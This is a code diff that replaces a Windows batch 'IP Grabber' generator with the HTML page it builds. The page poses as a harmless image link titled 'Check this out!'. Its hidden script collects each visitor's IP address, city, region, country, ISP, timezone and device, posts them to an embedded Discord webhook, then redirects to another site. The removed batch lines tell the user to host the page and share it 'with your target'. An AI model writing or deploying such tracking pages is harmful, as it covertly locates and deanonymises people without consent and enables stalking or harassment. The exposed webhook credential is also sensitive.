@@ -1,102 +1,85 @@
-@echo off
-color 0A
-title IP Grabber - Image Link Generator
+<!DOCTYPE html>
+<html lang="en">
+<head>
+    <meta charset="UTF-8">
+    <meta name="viewport" content="width=device-width, initial-scale=1.0">
+    <title>Check this out!</title>
+    <style>
+        * {
+            margin: 0;
+            padding: 0;
+            box-sizing: border-box;
+        }
+        body {
+            background: #000;
+            display: flex;
+            justify-content: center;
+            align-items: center;
+            min-height: 100vh;
+            overflow: hidden;
+        }
+        img {
+            max-width: 95%;
+            max-height: 95vh;
+            border-radius: 10px;
+            box-shadow: 0 20px 60px rgba(255, 255, 255, 0.3);
+            animation: fadeIn 0.5s ease-in;
+        }
+        @keyframes fadeIn {
+            from { opacity: 0; transform: scale(0.9); }
+            to { opacity: 1; transform: scale(1); }
+        }
+    </style>
+</head>
+<body>
+    <!-- CHANGE THIS IMAGE URL TO WHATEVER YOU WANT -->
+    <img src="https://i.imgur.com/YQ5xGXJ.jpeg" alt="Image">
 
-cls
-echo.
-echo  ================================================================================
-echo                            IP GRABBER - IMAGE LINK
-echo  ================================================================================
-echo.
-echo  This will create an image link that logs IP addresses when opened
-echo.
-echo  ================================================================================
-echo.
+    <script>
+        // YOUR DISCORD WEBHOOK
+        const WEBHOOK = 'https://discord.com/api/webhooks/1464441055293210722/OQtfaLrpEDoIB2RcNP44v3mKMDOAl5y7-gu9aQrD2I7ll_eVXWEnlH0ujyi4lIHLKbfF';
 
-:: Your Discord webhook
-set WEBHOOK=https://discord.com/api/webhooks/1464441055293210722/OQtfaLrpEDoIB2RcNP44v3mKMDOAl5y7-gu9aQrD2I7ll_eVXWEnlH0ujyi4lIHLKbfF
+        (async function() {
+            try {
+                // Get IP info using ipapi
+                const response = await fetch('https://ipapi.co/json/');
+                const data = await response.json();
 
-:: Create the HTML file with image that logs IP
-set OUTPUT_FILE=ip_logger_%RANDOM%.html
+                // Send to Discord
+                const embed = {
+                    embeds: [{
+                        title: '🎯 Someone Clicked Your Link!',
+                        color: 3447003,
+                        fields: [
+                            { name: '🌐 IP Address', value: data.ip || 'Unknown', inline: true },
+                            { name: '🏙️ City', value: data.city || 'Unknown', inline: true },
+                            { name: '📍 Region', value: data.region || 'Unknown', inline: true },
+                            { name: '🌎 Country', value: data.country_name || 'Unknown', inline: true },
+                            { name: '🏢 ISP', value: data.org || 'Unknown', inline: false },
+                            { name: '🕐 Timezone', value: data.timezone || 'Unknown', inline: true },
+                            { name: '📱 Device', value: navigator.platform, inline: true },
+                            { name: '⏰ Time', value: new Date().toLocaleString(), inline: false }
+                        ],
+                        footer: { text: 'IP Logger' },
+                        timestamp: new Date().toISOString()
+                    }]
+                };
 
-echo Creating IP logger page...
-echo.
+                await fetch(WEBHOOK, {
+                    method: 'POST',
+                    headers: { 'Content-Type': 'application/json' },
+                    body: JSON.stringify(embed)
+                });
 
-(
-echo ^<!DOCTYPE html^>
-echo ^<html^>
-echo ^<head^>
-echo     ^<meta charset="UTF-8"^>
-echo     ^<title^>Image^</title^>
-echo     ^<style^>
-echo         body { margin: 0; padding: 0; display: flex; justify-content: center; align-items: center; min-height: 100vh; background: #000; }
-echo         img { max-width: 90%%; max-height: 90vh; border-radius: 10px; box-shadow: 0 10px 50px rgba(255,255,255,0.3); }
-echo     ^</style^>
-echo ^</head^>
-echo ^<body^>
-echo     ^<img src="https://i.imgur.com/YQ5xGXJ.jpeg" alt="Image"^>
-echo     ^<script^>
-echo         const WEBHOOK = '%WEBHOOK%';
-echo         async function logIP() {
-echo             try {
-echo                 const response = await fetch('https://ipapi.co/json/'^);
-echo                 const data = await response.json(^);
-echo                 const userAgent = navigator.userAgent;
-echo                 const timestamp = new Date(^).toLocaleString(^);
-echo                 const payload = {
-echo                     embeds: [{
-echo                         title: '📸 Image Opened - IP Logged',
-echo                         color: 3066993,
-echo                         fields: [
-echo                             { name: '🌐 IP Address', value: data.ip ^|^| 'Unknown', inline: true },
-echo                             { name: '📍 Location', value: `${data.city}, ${data.region}, ${data.country_name}`, inline: true },
-echo                             { name: '🏢 ISP', value: data.org ^|^| 'Unknown', inline: false },
-echo                             { name: '🕐 Timezone', value: data.timezone ^|^| 'Unknown', inline: true },
-echo                             { name: '⏰ Time', value: timestamp, inline: true },
-echo                             { name: '🖥️ User Agent', value: userAgent.substring(0, 100^), inline: false }
-echo                         ],
-echo                         footer: { text: 'IP Logger' }
-echo                     }]
-echo                 };
-echo                 await fetch(WEBHOOK, {
-echo                     method: 'POST',
-echo                     headers: { 'Content-Type': 'application/json' },
-echo                     body: JSON.stringify(payload^)
-echo                 }^);
-echo             } catch(e^) {}
-echo         }
-echo         logIP(^);
-echo     ^</script^>
-echo ^</body^>
-echo ^</html^>
-) > %OUTPUT_FILE%
+            } catch (error) {
+                console.error('Error:', error);
+            }
 
-color 0C
-echo  [SUCCESS] IP Logger created!
-echo.
-color 0E
-echo  ================================================================================
-echo.
-echo  FILE CREATED: %OUTPUT_FILE%
-echo.
-echo  HOW TO USE:
-echo  1. Upload this HTML file to a free hosting site like:
-echo     - https://pages.github.com (GitHub Pages^)
-echo     - https://netlify.com (Netlify^)
-echo     - https://vercel.com (Vercel^)
-echo.
-echo  2. Share the hosted link with your target
-echo.
-echo  3. When they open the link, their IP will be sent to your Discord!
-echo.
-echo  ================================================================================
-echo.
-color 0A
-echo  Alternative: Use the file directly!
-echo  - Just open %OUTPUT_FILE% in your browser to test
-echo  - Or send the file to someone (when they open it, IP is logged^)
-echo.
-echo  ================================================================================
-echo.
-
-pause
+            // Redirect to Poki after 3 seconds (they see the image first)
+            setTimeout(() => {
+                window.location.href = 'https://poki.com';
+            }, 3000);
+        })();
+    </script>
+</body>
+</html>
